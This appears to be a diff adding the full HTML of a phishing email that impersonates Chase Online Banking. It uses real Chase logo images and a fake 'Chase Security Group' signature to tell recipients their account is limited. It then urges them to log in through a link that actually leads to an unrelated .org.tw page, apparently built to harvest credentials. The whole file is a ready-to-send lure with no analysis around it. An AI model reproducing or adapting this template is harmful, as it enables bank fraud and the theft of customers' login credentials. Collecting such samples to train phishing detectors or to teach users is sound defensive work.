@@ -1,0 +1,43 @@
+Subject:Chase Online : Account Status Notification 
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title>Chase Letter</title>
+<style type="text/css">
+<!--
+.Style1 {
+ font-size: 16px;
+ font-weight: bold;
+ color: blue;
+ font-family: Arial, Helvetica, sans-serif;
+}
+.Style4 {font-size: 14px; color: #000000;}
+-->
+</style>
+</head>
+<body>
+<p><img src="https://www.chase.com/online/Home/images/chaseNewlogo.gif" />
+</a><br />
+</p>
+<p class="Style1">Account Status Notification</p>
+<p class="Style4">Dear Chase Customers,</p>
+<p class="Style4">
+
+  We are contacting you to remind you that our Account Review Team identified that your account has been limited.<br> 
+In accordance with Chase Online Banking User Agreement and to ensure that your account has not been accessed from<br>  fraudulent locations, access to your account has been limited.<br><br>  
+  Your account access will remain limited until this issue has been resolved.<br> 
+Please log in your account by clicking on the link below:<br>
+<a href="http://www.xycc.org.tw/zenhow/01/catalog/images/go.php"/>my account activity</a>
+<img src="http://demo.chase.com/presents/preview/images/tout_chase_mobile.gif" /><br> 
+
+<p class="Style4">Thank You for using Chase Bank.<br> </a>
+<p class="Style4">Security Advisor Chase Online Banking Plc.<br> 
+The Chase Security Group.<br> </a>
+<p class="Style4">&#169; 2011 JPMorgan Chase & Co.</p>
+
+</body>
+</html>
+
+
+
